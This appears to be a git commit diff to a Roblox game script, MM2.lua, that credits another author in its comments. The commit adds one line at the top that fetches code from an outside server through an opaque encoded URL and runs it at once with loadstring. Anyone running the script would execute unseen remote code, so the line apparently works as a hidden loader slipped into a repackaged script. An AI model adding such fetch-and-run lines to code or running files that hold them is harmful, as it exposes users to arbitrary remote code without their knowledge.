0dfd11fbaad6f55780358ff6af7b279826e39682
VerifiedScript <wavyow@gmail.com>
2026-09-04 15:48:56 +0800

    Update MM2.lua

--- MM2.lua
+++ MM2.lua
@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://api.synscripts.org/run/eyJpZCI6IjAxZjE5NjY3LWNkYTEtNDdkMS04NTA4LTFjMmQyYjBlOGY3MSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0="))()
+
 -- IMDE Hub/main.lua
 -- sexy script by github.com/orialdev
 -- please give credit if you use anything from my code
